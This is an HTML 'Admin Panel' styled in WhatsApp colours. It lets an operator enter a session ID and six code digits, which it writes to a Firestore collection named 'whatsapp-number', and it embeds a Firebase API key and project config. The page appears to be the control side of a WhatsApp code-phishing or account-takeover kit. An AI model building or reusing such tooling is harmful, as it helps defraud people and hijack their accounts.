<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f2f2f2;
    }

    h2 {
      text-align: center;
      color: #25d366;
    }

    .field {
      margin-bottom: 15px;
    }

    input[type="text"] {
      padding: 10px;
      font-size: 16px;
      width: 100%;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    .otp-container {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin: 20px 0;
    }

    .otp-box {
      width: 50px;
      height: 60px;
      font-size: 28px;
      text-align: center;
      border-radius: 10px;
      border: 2px solid #ccc;
    }

    button {
      background: #25d366;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      display: block;
      margin: 20px auto;
    }

    button:hover {
      background: #1da851;
    }

    .message {
      text-align: center;
      margin-top: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h2>Admin Panel</h2>

  <div class="field">
    <label>Enter Session ID:</label>
    <input type="text" id="sessionId" placeholder="e.g. session-abc123">
  </div>

  <div class="otp-container">
    <input class="otp-box" maxlength="1" id="box1" />
    <input class="otp-box" maxlength="1" id="box2" />
    <input class="otp-box" maxlength="1" id="box3" />
    <input class="otp-box" maxlength="1" id="box4" />
    <input class="otp-box" maxlength="1" id="box5" />
    <input class="otp-box" maxlength="1" id="box6" />
  </div>

  <button onclick="updateBoxes()">Update Boxes</button>

  <div class="message" id="status"></div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
      authDomain: "sbighsh.firebaseapp.com",
      projectId: "sbighsh",
      storageBucket: "sbighsh.appspot.com",
      messagingSenderId: "685947657107",
      appId: "1:685947657107:web:471a0557bb72235272a666"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    async function updateBoxes() {
      const sessionId = document.getElementById('sessionId').value.trim();
      if (!sessionId) return alert("Please enter a session ID");

      const boxes = [];
      for (let i = 1; i <= 6; i++) {
        const val = document.getElementById(`box${i}`).value.trim();
        boxes.push(val);
      }

      try {
        await db.collection("whatsapp-number").doc(sessionId).update({ boxes });
        document.getElementById("status").textContent = "Boxes updated successfully!";
        document.getElementById("status").style.color = "green";
      } catch (err) {
        document.getElementById("status").textContent = "Error: " + err.message;
        document.getElementById("status").style.color = "red";
      }
    }
  </script>
</body>
</html>
